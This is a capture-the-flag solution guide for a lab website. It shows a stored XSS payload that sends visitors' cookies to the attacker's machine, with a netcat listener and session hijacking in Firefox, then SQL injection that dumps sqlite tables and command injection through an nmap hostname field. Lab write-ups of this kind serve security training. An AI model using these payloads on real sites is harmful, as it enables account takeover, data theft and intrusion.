# In Plain Site

_Solution Guide_


## Overview

For this challenge, there are a total of three tasks that need to be completed to get all the points available. These tasks revolve around analyzing a website and using any means necessary to elevate your privileges and find the three hex tokens associated with the site.

>**Note:** You will need to create your own account on the site before following this solution guide.

## High-jacking User Session with XSS

When on certain pages of the site, you will see that at the bottom of the page is a section where it shows the most recent comment that was made. After some analyzing of the site and testing, you will find that this section is vulnerable to a XSS attack. 

You can test it by making a comment, this can be on any post (new or already made) in order to make it so your comment is shown.

You can test if XSS will work by commenting on a post with the following code snippet:

`    <script>alert('XSS Vuln')</script>
`
If you then browse to the home page, you will see an alert pop and that will confirm that it is vulnerable to a XSS attack and so you know that you have the possibility of stealing session cookies from anyone who would browse to the website. 

From here you should start crafting your attack. Below are steps to implement it:

1. Create comment on post with the following code (edit to input the IP of your machine):

```javascript
    <script>new Image().src="http://**YOUR VM IP**/bogus.php?output="+document.cookie;</script>
```

2. Create a small script to implement a listener for connections that will be created from your XSS code being executed by another user. 

```bash
    while :
    do
        nc -lvp 80 
    done
```

3. From here, you can keep an eye on the terminal with the listener running. If you've done it correctly you should start to get output that looks like this:

<img src="img/xssOutput.PNG">

With this response, you can see the cookies from the user's session are present in the response and can be read after the string `output=`.
You should see that you have received two cookies:
 - `Session`
 - `Remember_token`

You now need to use these tokens in Firefox to highjack their session. This can be done by following these steps:

- Go to `bugle:5000` web page and make sure you're logged out.
- Open Firefox web dev tools (right click, select `inspect`).
- Go to the section `storage`.
- Expand the side section `cookies`.
- Click on the `+` in the top right of the dev tools to create new item.
- Set the name of it to the first cookie found:    `session`.
- Put the value of it as the string found after `session=` up until the `;` character as it signifies the end of the cookie for the first one.
- Repeat the entire process, but this time as the `remember_token` and its value. It will not have a `;` at the end of the string, the first space found will signify the end of this cookie.

It should look like this:

<img src="img/addCookie.PNG">

If done correctly, when you refresh the page, you should now be high-jacking the session of one of the users.

There are four users who will be browsing the site throughout the challenges duration, in order to proceed you will need to determine which user has elevated privileges. This can be done with trial and error of trying each of the cookies that are received until the correct one is found.

The user you will be looking for is `Eddie Brock` also known as `teamBrocket`. 

Once you log in you will see the `first token` will be posted in the top left of your page.


## Retrieving Files via SQL Injection

Once you get access, you will notice that you now have access to a new page on the site labeled `User Management`. This page is meant to search users and perform any changes on their accounts as needed.

If you look at the pages source code, you can see there is a script being used that is not used anywhere else on the site. 

<img src="img/userManagementScript.PNG">

You should gather that this script is meant to submit the value `*` into the search function if the field to search by is `None` and if the search string is '' (empty string).

This should be a hint that it is submitting this value to be ran within a SQL statement and that there is a vulnerability here for altering the statement to get the contents of the SQL Database. 

You can run the following command to view the contents of the database:

```sql
    * from sqlite_schema where type='table'--' 
```

The output will then be all the tables in the database as well as their structure. Since your goal is to get a specific file from the `File` table in the database, you can get the contents of that table with the following command:

```sql
    * from File--'
```

You'll see there are three files present, but the one you will want is `backup.pdf`. You can retrieve this file by specifying its `id` number within the SQL command:

```sql
    * from File where id=3--'
```

If you then compare the structure of the database found in the first SQL command with the output of the command retrieving `backup.pdf` you will find that the file is stored in the `blob` section of the record. The `blob` is stored in a byte format, so you will need to convert it back into a file before you can read it. Below is a python script that will handle converting it to file.

```python
    #/usr/bin/python3
    import io

    blob = b'**BLOB STRING HERE'
    bb = io.BytesIO()
    bb.write(blob)

    with open('file.pdf', 'wb') as f:
        f.write(bb.getbuffer())
```

You can now open the file and the `second token` will be present as well as the backup master credentials for the site.

## OS Command Injection

Now that you have the credentials for the highest permission account, you can view the `Scan Hosts` page.

It will prompt you to enter a hostname, and once you do it will return output that the VM is running a quick nmap scan against the host you entered.

From here you can then test trying to alter the command being entered. With trial and error, you can find the location of the final file labeled `token3.txt` and get the contents of it.

The following command will complete an OS Command Injection and get you the third token to complete this challenge.

```shell
    kali >/dev/null && cat /home/user/Desktop/site/static/token3.txt #
```
